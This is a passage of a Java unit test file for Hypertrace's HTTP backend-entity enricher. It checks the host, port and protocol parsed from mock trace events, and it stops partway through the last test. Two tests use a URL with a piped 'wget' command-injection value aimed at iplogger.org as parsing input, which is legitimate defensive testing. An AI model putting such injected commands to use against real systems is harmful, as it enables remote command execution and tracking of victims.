package org.hypertrace.traceenricher.enrichment.enrichers.backend.provider;

import static org.hypertrace.core.span.constants.v1.Http.HTTP_HOST;
import static org.hypertrace.core.span.constants.v1.Http.HTTP_PATH;
import static org.hypertrace.core.span.constants.v1.Http.HTTP_REQUEST_QUERY_STRING;
import static org.hypertrace.core.span.constants.v1.Http.HTTP_URL;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;

import com.google.common.cache.LoadingCache;
import com.typesafe.config.Config;
import com.typesafe.config.ConfigFactory;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.ExecutionException;
import org.hypertrace.core.datamodel.AttributeValue;
import org.hypertrace.core.datamodel.Attributes;
import org.hypertrace.core.datamodel.Event;
import org.hypertrace.core.datamodel.EventRef;
import org.hypertrace.core.datamodel.EventRefType;
import org.hypertrace.core.datamodel.MetricValue;
import org.hypertrace.core.datamodel.Metrics;
import org.hypertrace.core.datamodel.StructuredTrace;
import org.hypertrace.core.datamodel.eventfields.http.Request;
import org.hypertrace.core.datamodel.shared.StructuredTraceGraph;
import org.hypertrace.core.datamodel.shared.trace.AttributeValueCreator;
import org.hypertrace.core.span.constants.RawSpanConstants;
import org.hypertrace.core.span.constants.v1.Http;
import org.hypertrace.entity.constants.v1.BackendAttribute;
import org.hypertrace.entity.data.service.v1.Entity;
import org.hypertrace.traceenricher.enrichedspan.constants.BackendType;
import org.hypertrace.traceenricher.enrichedspan.constants.v1.Backend;
import org.hypertrace.traceenricher.enrichment.clients.ClientRegistry;
import org.hypertrace.traceenricher.enrichment.enrichers.backend.AbstractBackendEntityEnricher;
import org.hypertrace.traceenricher.enrichment.enrichers.backend.FqnResolver;
import org.hypertrace.traceenricher.enrichment.enrichers.backend.HypertraceFqnResolver;
import org.hypertrace.traceenricher.enrichment.enrichers.cache.EntityCache;
import org.hypertrace.traceenricher.enrichment.enrichers.resolver.backend.BackendInfo;
import org.hypertrace.traceenricher.util.Constants;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.Mockito;

public class HttpBackendProviderTest {
  private AbstractBackendEntityEnricher backendEntityEnricher;
  private StructuredTraceGraph structuredTraceGraph;
  private StructuredTrace structuredTrace;

  @BeforeEach
  public void setup() throws ExecutionException {
    backendEntityEnricher = new MockBackendEntityEnricher();
    ClientRegistry mockClientRegistry = mock(ClientRegistry.class);
    EntityCache mockEntityCache = mock(EntityCache.class);
    Mockito.when(mockClientRegistry.getEntityCache()).thenReturn(mockEntityCache);
    LoadingCache mockCache = mock(LoadingCache.class);
    Mockito.when(mockEntityCache.getBackendIdAttrsToEntityCache()).thenReturn(mockCache);
    Mockito.when(mockCache.get(any())).thenReturn(Optional.empty());
    backendEntityEnricher.init(ConfigFactory.empty(), mockClientRegistry);

    structuredTrace = mock(StructuredTrace.class);
    structuredTraceGraph = mock(StructuredTraceGraph.class);
  }

  @Test
  public void checkBackendEntityGeneratedFromHttpEventType1() {
    Event e =
        Event.newBuilder()
            .setCustomerId("__default")
            .setEventId(ByteBuffer.wrap("bdf03dfabf5c70f8".getBytes()))
            .setEntityIdList(Arrays.asList("4bfca8f7-4974-36a4-9385-dd76bf5c8824"))
            .setEnrichedAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "SPAN_TYPE",
                            AttributeValue.newBuilder().setValue("EXIT").build(),
                            "PROTOCOL",
                            AttributeValue.newBuilder().setValue("HTTP").build()))
                    .build())
            .setAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "http.status_code",
                            AttributeValue.newBuilder().setValue("200").build(),
                            "http.user_agent",
                            AttributeValue.newBuilder().setValue("").build(),
                            "http.path",
                            AttributeValue.newBuilder()
                                .setValue("/product/5d644175551847d7408760b1")
                                .build(),
                            "FLAGS",
                            AttributeValue.newBuilder().setValue("OK").build(),
                            "status.message",
                            AttributeValue.newBuilder().setValue("200").build(),
                            Constants.getRawSpanConstant(Http.HTTP_METHOD),
                            AttributeValue.newBuilder().setValue("GET").build(),
                            "http.host",
                            AttributeValue.newBuilder().setValue("dataservice:9394").build(),
                            "http.target",
                            AttributeValue.newBuilder().setValue("/path/12314/?q=ddds#123").build(),
                            "status.code",
                            AttributeValue.newBuilder().setValue("0").build()))
                    .build())
            .setEventName("Sent./product/5d644175551847d7408760b1")
            .setStartTimeMillis(1566869077746L)
            .setEndTimeMillis(1566869077750L)
            .setMetrics(
                Metrics.newBuilder()
                    .setMetricMap(
                        Map.of("Duration", MetricValue.newBuilder().setValue(4.0).build()))
                    .build())
            .setEventRefList(
                Arrays.asList(
                    EventRef.newBuilder()
                        .setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                        .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
                        .setRefType(EventRefType.CHILD_OF)
                        .build()))
            .setHttp(
                org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
                    .setRequest(
                        Request.newBuilder()
                            .setHost("dataservice:9394")
                            .setPath("/product/5d644175551847d7408760b1")
                            .setMethod("GET")
                            .build())
                    .build())
            .build();

    final BackendInfo backendInfo =
        backendEntityEnricher.resolve(e, structuredTrace, structuredTraceGraph).get();
    final Entity backendEntity = backendInfo.getEntity();
    assertEquals(backendEntity.getEntityName(), "dataservice:9394");
    assertEquals(3, backendEntity.getIdentifyingAttributesCount());
    assertEquals(
        BackendType.HTTP.name(),
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PROTOCOL))
            .getValue()
            .getString());
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_HOST))
            .getValue()
            .getString(),
        "dataservice");
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PORT))
            .getValue()
            .getString(),
        "9394");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT))
            .getValue()
            .getString(),
        "Sent./product/5d644175551847d7408760b1");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT_ID))
            .getValue()
            .getString(),
        "62646630336466616266356337306638");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getRawSpanConstant(Http.HTTP_METHOD))
            .getValue()
            .getString(),
        "GET");

    Map<String, AttributeValue> attributes = backendInfo.getAttributes();
    assertEquals(
        Map.of(
            "BACKEND_DESTINATION",
            AttributeValueCreator.create("/product/5d644175551847d7408760b1"),
            "BACKEND_OPERATION",
            AttributeValueCreator.create("GET")),
        attributes);
  }

  @Test
  public void checkBackendEntityGeneratedFromHttpEventType2() {
    Event e =
        Event.newBuilder()
            .setCustomerId("__default")
            .setEventId(ByteBuffer.wrap("bdf03dfabf5c70f8".getBytes()))
            .setEntityIdList(Arrays.asList("4bfca8f7-4974-36a4-9385-dd76bf5c8824"))
            .setEnrichedAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "SPAN_TYPE",
                            AttributeValue.newBuilder().setValue("EXIT").build(),
                            "PROTOCOL",
                            AttributeValue.newBuilder().setValue("HTTP").build()))
                    .build())
            .setAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "http.response.header.x-envoy-upstream-service-time",
                            AttributeValue.newBuilder().setValue("11").build(),
                            "http.response.header.x-forwarded-proto",
                            AttributeValue.newBuilder().setValue("http").build(),
                            "http.status_code",
                            AttributeValue.newBuilder().setValue("200").build(),
                            "FLAGS",
                            AttributeValue.newBuilder().setValue("OK").build(),
                            "http.protocol",
                            AttributeValue.newBuilder().setValue("HTTP/1.1").build(),
                            Constants.getRawSpanConstant(Http.HTTP_METHOD),
                            AttributeValue.newBuilder().setValue("GET").build(),
                            Constants.getRawSpanConstant((Http.HTTP_HOST)),
                            AttributeValue.newBuilder().setValue("dataservice:9394").build(),
                            Constants.getRawSpanConstant((Http.HTTP_PATH)),
                            AttributeValue.newBuilder()
                                .setValue("product/5d644175551847d7408760b4")
                                .build(),
                            "http.url",
                            AttributeValue.newBuilder()
                                .setValue(
                                    "http://dataservice:9394/product/5d644175551847d7408760b4")
                                .build(),
                            "downstream_cluster",
                            AttributeValue.newBuilder().setValue("-").build()))
                    .build())
            .setEventName("egress_http")
            .setStartTimeMillis(1566869077746L)
            .setEndTimeMillis(1566869077750L)
            .setMetrics(
                Metrics.newBuilder()
                    .setMetricMap(
                        Map.of("Duration", MetricValue.newBuilder().setValue(4.0).build()))
                    .build())
            .setEventRefList(
                Arrays.asList(
                    EventRef.newBuilder()
                        .setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                        .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
                        .setRefType(EventRefType.CHILD_OF)
                        .build()))
            .setHttp(
                org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
                    .setRequest(
                        Request.newBuilder()
                            .setUrl("http://dataservice:9394/product/5d644175551847d7408760b4")
                            .setHost("dataservice:9394")
                            .setPath("product/5d644175551847d7408760b4")
                            .build())
                    .build())
            .build();

    final Entity backendEntity =
        backendEntityEnricher.resolve(e, structuredTrace, structuredTraceGraph).get().getEntity();
    assertEquals("dataservice:9394", backendEntity.getEntityName());
    assertEquals(3, backendEntity.getIdentifyingAttributesCount());
    assertEquals(
        BackendType.HTTP.name(),
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PROTOCOL))
            .getValue()
            .getString());
    assertEquals(
        "dataservice",
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_HOST))
            .getValue()
            .getString());
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PORT))
            .getValue()
            .getString(),
        "9394");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT))
            .getValue()
            .getString(),
        "egress_http");
    assertEquals(
        "62646630336466616266356337306638",
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT_ID))
            .getValue()
            .getString());
    assertEquals(
        "GET",
        backendEntity
            .getAttributesMap()
            .get(Constants.getRawSpanConstant(Http.HTTP_METHOD))
            .getValue()
            .getString());
  }

  @Test
  public void checkBackendEntityGeneratedFromHttpEventType3() {
    Event e =
        Event.newBuilder()
            .setCustomerId("__default")
            .setEventId(ByteBuffer.wrap("bdf03dfabf5c70f8".getBytes()))
            .setEntityIdList(Arrays.asList("4bfca8f7-4974-36a4-9385-dd76bf5c8824"))
            .setEnrichedAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "SPAN_TYPE",
                            AttributeValue.newBuilder().setValue("EXIT").build(),
                            "PROTOCOL",
                            AttributeValue.newBuilder().setValue("HTTP").build()))
                    .build())
            .setAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            RawSpanConstants.getValue(HTTP_URL),
                            AttributeValue.newBuilder()
                                .setValue(
                                    "http://dataservice:9394/userreview?productId=5d644175551847d7408760b4")
                                .build(),
                            RawSpanConstants.getValue(HTTP_HOST),
                            AttributeValue.newBuilder().setValue("dataservice:9394").build(),
                            RawSpanConstants.getValue(HTTP_PATH),
                            AttributeValue.newBuilder().setValue("/userreview").build(),
                            RawSpanConstants.getValue(HTTP_REQUEST_QUERY_STRING),
                            AttributeValue.newBuilder()
                                .setValue("productId=5d644175551847d7408760b4")
                                .build(),
                            "http.request.method",
                            AttributeValue.newBuilder().setValue("GET").build(),
                            "FLAGS",
                            AttributeValue.newBuilder().setValue("OK").build(),
                            "http.request.url",
                            AttributeValue.newBuilder()
                                .setValue(
                                    "http://dataservice:9394/userreview?productId=5d644175551847d7408760b4")
                                .build()))
                    .build())
            .setEventName("jaxrs.client.exit")
            .setStartTimeMillis(1566869077746L)
            .setEndTimeMillis(1566869077750L)
            .setMetrics(
                Metrics.newBuilder()
                    .setMetricMap(
                        Map.of("Duration", MetricValue.newBuilder().setValue(4.0).build()))
                    .build())
            .setEventRefList(
                Arrays.asList(
                    EventRef.newBuilder()
                        .setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                        .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
                        .setRefType(EventRefType.CHILD_OF)
                        .build()))
            .build();

    final Entity backendEntity =
        backendEntityEnricher.resolve(e, structuredTrace, structuredTraceGraph).get().getEntity();
    assertEquals("dataservice:9394", backendEntity.getEntityName());
    assertEquals(3, backendEntity.getIdentifyingAttributesCount());
    assertEquals(
        BackendType.HTTP.name(),
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PROTOCOL))
            .getValue()
            .getString());
    assertEquals(
        "dataservice",
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_HOST))
            .getValue()
            .getString());
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PORT))
            .getValue()
            .getString(),
        "9394");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT))
            .getValue()
            .getString(),
        "jaxrs.client.exit");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT_ID))
            .getValue()
            .getString(),
        "62646630336466616266356337306638");
    assertEquals(
        backendEntity.getAttributesMap().get("http.request.method").getValue().getString(), "GET");
  }

  @Test
  public void checkBackendEntityGeneratedFromHttpEventType4() {
    Event e =
        Event.newBuilder()
            .setCustomerId("__default")
            .setEventId(ByteBuffer.wrap("bdf03dfabf5c70f8".getBytes()))
            .setEntityIdList(Arrays.asList("4bfca8f7-4974-36a4-9385-dd76bf5c8824"))
            .setEnrichedAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "SPAN_TYPE",
                            AttributeValue.newBuilder().setValue("EXIT").build(),
                            "PROTOCOL",
                            AttributeValue.newBuilder().setValue("HTTP").build()))
                    .build())
            .setAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            RawSpanConstants.getValue(HTTP_URL),
                            AttributeValue.newBuilder()
                                .setValue(
                                    "http://dataservice:80/userreview?productId=5d644175551847d7408760b4")
                                .build(),
                            RawSpanConstants.getValue(HTTP_HOST),
                            AttributeValue.newBuilder().setValue("dataservice:80").build(),
                            RawSpanConstants.getValue(HTTP_PATH),
                            AttributeValue.newBuilder().setValue("/userreview").build(),
                            RawSpanConstants.getValue(HTTP_REQUEST_QUERY_STRING),
                            AttributeValue.newBuilder()
                                .setValue("productId=5d644175551847d7408760b4")
                                .build(),
                            "http.request.method",
                            AttributeValue.newBuilder().setValue("GET").build(),
                            "FLAGS",
                            AttributeValue.newBuilder().setValue("OK").build(),
                            "http.request.url",
                            AttributeValue.newBuilder()
                                .setValue(
                                    "http://dataservice:80/userreview?productId=5d644175551847d7408760b4")
                                .build()))
                    .build())
            .setEventName("jaxrs.client.exit")
            .setStartTimeMillis(1566869077746L)
            .setEndTimeMillis(1566869077750L)
            .setMetrics(
                Metrics.newBuilder()
                    .setMetricMap(
                        Map.of("Duration", MetricValue.newBuilder().setValue(4.0).build()))
                    .build())
            .setEventRefList(
                Arrays.asList(
                    EventRef.newBuilder()
                        .setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                        .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
                        .setRefType(EventRefType.CHILD_OF)
                        .build()))
            .build();

    final Entity backendEntity =
        backendEntityEnricher.resolve(e, structuredTrace, structuredTraceGraph).get().getEntity();
    assertEquals("dataservice", backendEntity.getEntityName());
    assertEquals(3, backendEntity.getIdentifyingAttributesCount());
    assertEquals(
        BackendType.HTTP.name(),
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PROTOCOL))
            .getValue()
            .getString());
    assertEquals(
        "dataservice",
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_HOST))
            .getValue()
            .getString());
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PORT))
            .getValue()
            .getString(),
        "-1");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT))
            .getValue()
            .getString(),
        "jaxrs.client.exit");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT_ID))
            .getValue()
            .getString(),
        "62646630336466616266356337306638");
    assertEquals(
        backendEntity.getAttributesMap().get("http.request.method").getValue().getString(), "GET");
  }

  @Test
  public void checkBackendEntityGeneratedFromHttpsEvent() {
    Event e =
        Event.newBuilder()
            .setCustomerId("__default")
            .setEventId(ByteBuffer.wrap("bdf03dfabf5c707f".getBytes()))
            .setEntityIdList(Arrays.asList("4bfca8f7-4974-36a4-9385-dd76bf5c8865"))
            .setEnrichedAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "SPAN_TYPE",
                            AttributeValue.newBuilder().setValue("EXIT").build(),
                            "PROTOCOL",
                            AttributeValue.newBuilder().setValue("HTTPS").build()))
                    .build())
            .setAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "http.status_code",
                            AttributeValue.newBuilder().setValue("200").build(),
                            "http.user_agent",
                            AttributeValue.newBuilder().setValue("").build(),
                            "http.path",
                            AttributeValue.newBuilder()
                                .setValue("/product/5d644175551847d7408760b1")
                                .build(),
                            "FLAGS",
                            AttributeValue.newBuilder().setValue("OK").build(),
                            "status.message",
                            AttributeValue.newBuilder().setValue("200").build(),
                            Constants.getRawSpanConstant(Http.HTTP_METHOD),
                            AttributeValue.newBuilder().setValue("GET").build(),
                            "http.host",
                            AttributeValue.newBuilder().setValue("dataservice:9394").build(),
                            "status.code",
                            AttributeValue.newBuilder().setValue("0").build()))
                    .build())
            .setEventName("Sent./product/5d644175551847d7408760b1")
            .setStartTimeMillis(1566869077746L)
            .setEndTimeMillis(1566869077750L)
            .setMetrics(
                Metrics.newBuilder()
                    .setMetricMap(
                        Map.of("Duration", MetricValue.newBuilder().setValue(4.0).build()))
                    .build())
            .setEventRefList(
                Arrays.asList(
                    EventRef.newBuilder()
                        .setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                        .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
                        .setRefType(EventRefType.CHILD_OF)
                        .build()))
            .setHttp(
                org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
                    .setRequest(
                        Request.newBuilder()
                            .setHost("dataservice:9394")
                            .setPath("/product/5d644175551847d7408760b1")
                            .build())
                    .build())
            .build();

    final Entity backendEntity =
        backendEntityEnricher.resolve(e, structuredTrace, structuredTraceGraph).get().getEntity();
    assertEquals(backendEntity.getEntityName(), "dataservice:9394");
    assertEquals(3, backendEntity.getIdentifyingAttributesCount());
    assertEquals(
        BackendType.HTTPS.name(),
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PROTOCOL))
            .getValue()
            .getString());
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_HOST))
            .getValue()
            .getString(),
        "dataservice");
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PORT))
            .getValue()
            .getString(),
        "9394");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT))
            .getValue()
            .getString(),
        "Sent./product/5d644175551847d7408760b1");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT_ID))
            .getValue()
            .getString(),
        "62646630336466616266356337303766");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getRawSpanConstant(Http.HTTP_METHOD))
            .getValue()
            .getString(),
        "GET");
  }

  @Test
  public void checkBackendEntityGeneratedFromHttpsEvent2() {
    Event e =
        Event.newBuilder()
            .setCustomerId("__default")
            .setEventId(ByteBuffer.wrap("bdf03dfabf5c707f".getBytes()))
            .setEntityIdList(Arrays.asList("4bfca8f7-4974-36a4-9385-dd76bf5c8865"))
            .setEnrichedAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "SPAN_TYPE",
                            AttributeValue.newBuilder().setValue("EXIT").build(),
                            "PROTOCOL",
                            AttributeValue.newBuilder().setValue("HTTPS").build()))
                    .build())
            .setAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "http.status_code",
                            AttributeValue.newBuilder().setValue("200").build(),
                            "http.user_agent",
                            AttributeValue.newBuilder().setValue("").build(),
                            "http.path",
                            AttributeValue.newBuilder()
                                .setValue("/product/5d644175551847d7408760b1")
                                .build(),
                            "FLAGS",
                            AttributeValue.newBuilder().setValue("OK").build(),
                            "status.message",
                            AttributeValue.newBuilder().setValue("200").build(),
                            Constants.getRawSpanConstant(Http.HTTP_METHOD),
                            AttributeValue.newBuilder().setValue("GET").build(),
                            "http.host",
                            AttributeValue.newBuilder().setValue("dataservice:443").build(),
                            "status.code",
                            AttributeValue.newBuilder().setValue("0").build()))
                    .build())
            .setEventName("Sent./product/5d644175551847d7408760b1")
            .setStartTimeMillis(1566869077746L)
            .setEndTimeMillis(1566869077750L)
            .setMetrics(
                Metrics.newBuilder()
                    .setMetricMap(
                        Map.of("Duration", MetricValue.newBuilder().setValue(4.0).build()))
                    .build())
            .setEventRefList(
                Arrays.asList(
                    EventRef.newBuilder()
                        .setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                        .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
                        .setRefType(EventRefType.CHILD_OF)
                        .build()))
            .setHttp(
                org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
                    .setRequest(
                        Request.newBuilder()
                            .setHost("dataservice:443")
                            .setPath("/product/5d644175551847d7408760b1")
                            .build())
                    .build())
            .build();

    final Entity backendEntity =
        backendEntityEnricher.resolve(e, structuredTrace, structuredTraceGraph).get().getEntity();
    assertEquals(backendEntity.getEntityName(), "dataservice");
    assertEquals(3, backendEntity.getIdentifyingAttributesCount());
    assertEquals(
        BackendType.HTTPS.name(),
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PROTOCOL))
            .getValue()
            .getString());
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_HOST))
            .getValue()
            .getString(),
        "dataservice");
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PORT))
            .getValue()
            .getString(),
        "-1");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT))
            .getValue()
            .getString(),
        "Sent./product/5d644175551847d7408760b1");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT_ID))
            .getValue()
            .getString(),
        "62646630336466616266356337303766");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getRawSpanConstant(Http.HTTP_METHOD))
            .getValue()
            .getString(),
        "GET");
  }

  @Test
  public void checkBackendEntityGeneratedFromHttpEventUrlWithIllegalQueryCharacter() {
    Event e =
        Event.newBuilder()
            .setCustomerId("__default")
            .setEventId(ByteBuffer.wrap("bdf03dfabf5c70f8".getBytes()))
            .setEntityIdList(Arrays.asList("4bfca8f7-4974-36a4-9385-dd76bf5c8824"))
            .setEnrichedAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "SPAN_TYPE",
                            AttributeValue.newBuilder().setValue("EXIT").build(),
                            "PROTOCOL",
                            AttributeValue.newBuilder().setValue("HTTP").build()))
                    .build())
            .setAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            RawSpanConstants.getValue(HTTP_HOST),
                            AttributeValue.newBuilder().setValue("dataservice:9394").build(),
                            RawSpanConstants.getValue(HTTP_PATH),
                            AttributeValue.newBuilder().setValue("/api/timelines").build(),
                            "http.response.header.x-envoy-upstream-service-time",
                            AttributeValue.newBuilder().setValue("11").build(),
                            "http.response.header.x-forwarded-proto",
                            AttributeValue.newBuilder().setValue("http").build(),
                            "http.status_code",
                            AttributeValue.newBuilder().setValue("200").build(),
                            "FLAGS",
                            AttributeValue.newBuilder().setValue("OK").build(),
                            "http.protocol",
                            AttributeValue.newBuilder().setValue("HTTP/1.1").build(),
                            Constants.getRawSpanConstant(Http.HTTP_METHOD),
                            AttributeValue.newBuilder().setValue("GET").build(),
                            "http.url",
                            AttributeValue.newBuilder()
                                .setValue(
                                    "http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
                                .build(),
                            "downstream_cluster",
                            AttributeValue.newBuilder().setValue("-").build()))
                    .build())
            .setEventName("egress_http")
            .setStartTimeMillis(1566869077746L)
            .setEndTimeMillis(1566869077750L)
            .setMetrics(
                Metrics.newBuilder()
                    .setMetricMap(
                        Map.of("Duration", MetricValue.newBuilder().setValue(4.0).build()))
                    .build())
            .setEventRefList(
                Arrays.asList(
                    EventRef.newBuilder()
                        .setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                        .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
                        .setRefType(EventRefType.CHILD_OF)
                        .build()))
            .setHttp(
                org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
                    .setRequest(
                        Request.newBuilder()
                            .setUrl(
                                "http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
                            .setHost("dataservice:9394")
                            .setPath("/api/timelines")
                            .setQueryString("uri=|%20wget%20https://iplogger.org/1pzQq")
                            .build())
                    .build())
            .build();

    Entity backendEntity =
        backendEntityEnricher.resolve(e, structuredTrace, structuredTraceGraph).get().getEntity();
    assertEquals("dataservice:9394", backendEntity.getEntityName());
    assertEquals(3, backendEntity.getIdentifyingAttributesCount());
    assertEquals(
        "HTTP",
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PROTOCOL))
            .getValue()
            .getString());
    assertEquals(
        "dataservice",
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_HOST))
            .getValue()
            .getString());
    assertEquals(
        "9394",
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PORT))
            .getValue()
            .getString());
    assertEquals(
        "egress_http",
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT))
            .getValue()
            .getString());
    assertEquals(
        "62646630336466616266356337306638",
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT_ID))
            .getValue()
            .getString());
    assertEquals(
        "GET",
        backendEntity
            .getAttributesMap()
            .get(Constants.getRawSpanConstant(Http.HTTP_METHOD))
            .getValue()
            .getString());
  }

  @Test
  public void checkBackendEntityGeneratedFromHttpEventUrlWithIllegalCharacterAndHttpHostSet() {
    Event e =
        Event.newBuilder()
            .setCustomerId("__default")
            .setEventId(ByteBuffer.wrap("bdf03dfabf5c70f8".getBytes()))
            .setEntityIdList(Arrays.asList("4bfca8f7-4974-36a4-9385-dd76bf5c8824"))
            .setEnrichedAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "SPAN_TYPE",
                            AttributeValue.newBuilder().setValue("EXIT").build(),
                            "PROTOCOL",
                            AttributeValue.newBuilder().setValue("HTTP").build()))
                    .build())
            .setAttributes(
                Attributes.newBuilder()
                    .setAttributeMap(
                        Map.of(
                            "http.status_code",
                            AttributeValue.newBuilder().setValue("200").build(),
                            "http.user_agent",
                            AttributeValue.newBuilder().setValue("").build(),
                            "http.url",
                            AttributeValue.newBuilder()
                                .setValue(
                                    "http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
                                .build(),
                            "http.path",
                            AttributeValue.newBuilder()
                                .setValue(
                                    "/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
                                .build(),
                            "FLAGS",
                            AttributeValue.newBuilder().setValue("OK").build(),
                            "status.message",
                            AttributeValue.newBuilder().setValue("200").build(),
                            Constants.getRawSpanConstant(Http.HTTP_METHOD),
                            AttributeValue.newBuilder().setValue("GET").build(),
                            "http.host",
